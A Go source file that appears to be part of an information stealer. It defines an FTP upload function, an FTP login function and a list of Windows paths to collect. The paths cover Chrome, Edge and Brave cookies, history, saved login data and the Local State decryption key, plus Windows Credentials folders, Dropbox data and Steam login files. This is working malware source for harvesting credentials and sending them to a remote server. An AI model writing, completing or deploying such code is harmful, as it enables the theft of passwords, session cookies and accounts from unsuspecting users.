package main

import (
	"fmt"
	"os"

	"github.com/jlaffaye/ftp"
)

// Load file on FTP server
func UploadFileToFTP(ftpClient *ftp.ServerConn, localFilePath, remotePath string) error {
	file, err := os.Open(localFilePath)
	if err != nil {
		return fmt.Errorf("failed to open file %s: %v", localFilePath, err)
	}
	defer file.Close()

	err = ftpClient.Stor(remotePath, file)
	if err != nil {
		return fmt.Errorf("failed to upload file %s: %v", localFilePath, err)
	}
	return nil
}

// FTP connection
func ConnectToFTP(server string, port int, user, password string) (*ftp.ServerConn, error) {
	ftpClient, err := ftp.Dial(fmt.Sprintf("%s:%d", server, port))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to FTP server: %v", err)
	}

	err = ftpClient.Login(user, password)
	if err != nil {
		return nil, fmt.Errorf("failed to login to FTP server: %v", err)
	}

	return ftpClient, nil
}

// List of directory to copy
func GetDirectories() ([]string, error) {
	// Username of the current use used to explore directory
	currentUser := os.Getenv("USERNAME")
	if currentUser == "" {
		return nil, fmt.Errorf("could not retrieve the current user name. Ensure the USERNAME environment variable is set")
	}

	// List of directory to copy
	directories := []string{
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Login Data`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Local State`, currentUser), // Chrome cypher key
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Cookies`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\History`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Login Data`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Local State`, currentUser), // Edge cypher key
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Credentials`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Microsoft\Credentials`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State`, currentUser), // Brave cypher key
		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Dropbox\info.json`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Dropbox\cache`, currentUser),
		fmt.Sprintf(`C:\Users\%s\AppData\Local\Steam\htmlcache`, currentUser),
		fmt.Sprintf(`C:\Program Files (x86)\Steam\config\loginusers.vdf`, currentUser),
	}

	return directories, nil
}
